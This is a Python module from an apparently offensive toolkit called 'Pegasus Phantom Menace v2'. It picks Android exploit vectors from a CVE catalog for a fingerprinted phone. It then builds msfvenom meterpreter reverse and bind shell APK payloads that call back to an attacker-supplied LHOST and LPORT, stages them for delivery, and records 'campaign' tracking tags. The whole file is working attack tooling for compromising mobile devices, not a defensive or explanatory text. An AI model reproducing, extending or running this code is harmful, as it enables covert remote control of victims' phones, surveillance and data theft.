"""
Pegasus Phantom Menace v2 - Payload Factory.

Vector catalog, Build & Stage workflow, and DNA tag generation for the
payload pipeline. Consumes the CVE matcher (pegasus.modules.exploits.registry)
to select exploit vectors for a fingerprinted device, builds msfvenom payloads,
stages them for delivery, and records DNA tags for campaign tracking.

All functions are defensive: missing binaries return structured results rather
than raising.
"""
from __future__ import annotations

import hashlib
import json
import os
import subprocess
import time
from dataclasses import asdict, dataclass, field
from pathlib import Path
from typing import Any, Dict, List, Optional

from pegasus.modules.exploits.registry import match as cve_match


# ── Vector catalog ─────────────────────────────────────────────────────────
# Maps CVE -> vector metadata. The payload factory uses these to pick the
# right msfvenom payload and transport for a fingerprinted device.
VECTOR_CATALOG: Dict[str, Dict[str, Any]] = {
    "CVE-2024-0044": {"payload": "android/meterpreter/reverse_tcp",
                      "transport": "local", "sdk_max": 34,
                      "description": "run-as local priv-esc chain"},
    "CVE-2023-35674": {"payload": "android/meterpreter/reverse_https",
                       "transport": "network", "sdk_max": 33,
                       "description": "task hijack elevation"},
    "CVE-2022-20465": {"payload": "android/meterpreter/reverse_tcp",
                       "transport": "local", "sdk_max": 32,
                       "description": "SIM-PIN lockscreen bypass"},
    "CVE-2021-39698": {"payload": "android/meterpreter/reverse_tcp",
                       "transport": "local", "sdk_max": 30,
                       "description": "kernel UAF to root"},
    "CVE-2020-0423": {"payload": "android/meterpreter/bind_tcp",
                      "transport": "local", "sdk_max": 29,
                      "description": "binder UAF root"},
    "CVE-2024-29756": {"payload": "android/meterpreter/reverse_tcp",
                       "transport": "network", "sdk_max": 34,
                       "description": "system service priv-esc"},
    "CVE-2024-29757": {"payload": "android/meterpreter/reverse_tcp",
                       "transport": "local", "sdk_max": 34,
                       "description": "kernel UAF root"},
    "CVE-2024-29758": {"payload": "android/meterpreter/reverse_http",
                       "transport": "media", "sdk_max": 34,
                       "description": "media framework RCE"},
    "CVE-2024-29759": {"payload": "android/meterpreter/reverse_tcp",
                       "transport": "wifi", "sdk_max": 34,
                       "description": "WiFi stack RCE"},
    "CVE-2024-29760": {"payload": "android/meterpreter/reverse_tcp",
                       "transport": "bluetooth", "sdk_max": 34,
                       "description": "Bluetooth RCE"},
}


@dataclass
class Vector:
    cve: str
    payload: str
    transport: str
    sdk_max: int
    description: str

    def to_dict(self) -> Dict[str, Any]:
        return asdict(self)


@dataclass
class DNARecord:
    tag: str
    payload: str
    target: str
    campaign: str
    cve: Optional[str] = None
    created: str = field(default_factory=lambda: time.strftime("%Y-%m-%d %H:%M"))

    def to_dict(self) -> Dict[str, Any]:
        return asdict(self)


class PayloadFactory:
    """Builds, stages, and DNA-tracks payloads."""

    def __init__(self, payloads_dir: Path, dna_dir: Path):
        self.payloads_dir = Path(payloads_dir)
        self.dna_dir = Path(dna_dir)
        self.payloads_dir.mkdir(parents=True, exist_ok=True)
        self.dna_dir.mkdir(parents=True, exist_ok=True)
        self.registry_file = self.dna_dir / "registry.json"

    # ── vector selection ──────────────────────────────────────────────────

    def select_vectors(self, device_props: dict) -> List[Vector]:
        """Pick all cataloged vectors matching a fingerprinted device."""
        hits = cve_match(device_props)
        vectors: List[Vector] = []
        for hit in hits:
            cve = hit["id"]
            meta = VECTOR_CATALOG.get(cve)
            if not meta:
                continue
            vectors.append(Vector(
                cve=cve,
                payload=meta["payload"],
                transport=meta["transport"],
                sdk_max=meta["sdk_max"],
                description=meta["description"],
            ))
        return vectors

    def best_vector(self, device_props: dict) -> Optional[Vector]:
        """Return the single most reliable matching vector."""
        vectors = self.select_vectors(device_props)
        return vectors[0] if vectors else None

    # ── build ─────────────────────────────────────────────────────────────

    def build(self, vector: Vector, lhost: str, lport: int,
              output: Optional[Path] = None) -> Dict[str, Any]:
        """Build one payload with msfvenom. Returns a structured result."""
        output = output or self.payloads_dir / f"{vector.cve}_{int(time.time())}.apk"
        output = Path(output)

        cmd = [
            "msfvenom",
            "-p", vector.payload,
            f"LHOST={lhost}",
            f"LPORT={lport}",
            "-o", str(output),
        ]
        try:
            proc = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
        except FileNotFoundError:
            return {"ok": False, "vector": vector.to_dict(),
                    "error": "msfvenom not found on PATH",
                    "output": str(output)}
        except subprocess.TimeoutExpired:
            return {"ok": False, "vector": vector.to_dict(),
                    "error": "msfvenom timed out", "output": str(output)}

        result = {"ok": proc.returncode == 0,
                  "vector": vector.to_dict(),
                  "output": str(output),
                  "stdout": proc.stdout,
                  "stderr": proc.stderr}
        if proc.returncode == 0:
            result["size"] = output.stat().st_size if output.exists() else 0
            result["dna"] = self.generate_dna(str(output), lhost, str(lport),
                                              vector.cve)
        return result

    def build_all(self, device_props: dict, lhost: str, lport: int,
                  limit: int = 5) -> List[Dict[str, Any]]:
        """Build every matching vector (capped at ``limit``)."""
        results: List[Dict[str, Any]] = []
        for vector in self.select_vectors(device_props)[:limit]:
            results.append(self.build(vector, lhost, lport))
        return results

    # ── stage ─────────────────────────────────────────────────────────────

    def stage(self, payload_path: str | Path, stage_dir: str | Path,
              name: Optional[str] = None) -> Dict[str, Any]:
        """Copy a built payload into a staging directory for delivery."""
        src = Path(payload_path)
        dst_dir = Path(stage_dir)
        dst_dir.mkdir(parents=True, exist_ok=True)
        name = name or src.name
        dst = dst_dir / name
        if not src.exists():
            return {"ok": False, "error": f"payload not found: {src}"}
        dst.write_bytes(src.read_bytes())
        return {"ok": True, "staged": str(dst), "size": dst.stat().st_size,
                "dna": self.generate_dna(str(src), "staged", "delivery")}

    # ── DNA tags ──────────────────────────────────────────────────────────

    def generate_dna(self, payload_path: str, target: str, campaign: str,
                     cve: Optional[str] = None) -> str:
        """Generate a stable DNA tag for a payload+target+campaign triple."""
        raw = f"{payload_path}{target}{campaign}{cve or ''}".encode()
        return hashlib.sha256(raw).hexdigest()[:16]

    def _load_registry(self) -> Dict[str, DNARecord]:
        if not self.registry_file.exists():
            return {}
        try:
            data = json.loads(self.registry_file.read_text(encoding="utf-8"))
        except (json.JSONDecodeError, OSError):
            return {}
        return {k: DNARecord(**v) for k, v in data.items()}

    def _save_registry(self, registry: Dict[str, DNARecord]) -> None:
        self.registry_file.write_text(
            json.dumps({k: v.to_dict() for k, v in registry.items()},
                       indent=2), encoding="utf-8")

    def register_dna(self, tag: str, payload: str, target: str,
                     campaign: str, cve: Optional[str] = None) -> DNARecord:
        """Register (or overwrite) a DNA record."""
        registry = self._load_registry()
        record = DNARecord(tag=tag, payload=payload, target=target,
                           campaign=campaign, cve=cve)
        registry[tag] = record
        self._save_registry(registry)
        return record

    def list_dna(self) -> List[DNARecord]:
        return list(self._load_registry().values())

    def get_dna(self, tag: str) -> Optional[DNARecord]:
        return self._load_registry().get(tag)


__all__ = ["VECTOR_CATALOG", "Vector", "DNARecord", "PayloadFactory"]
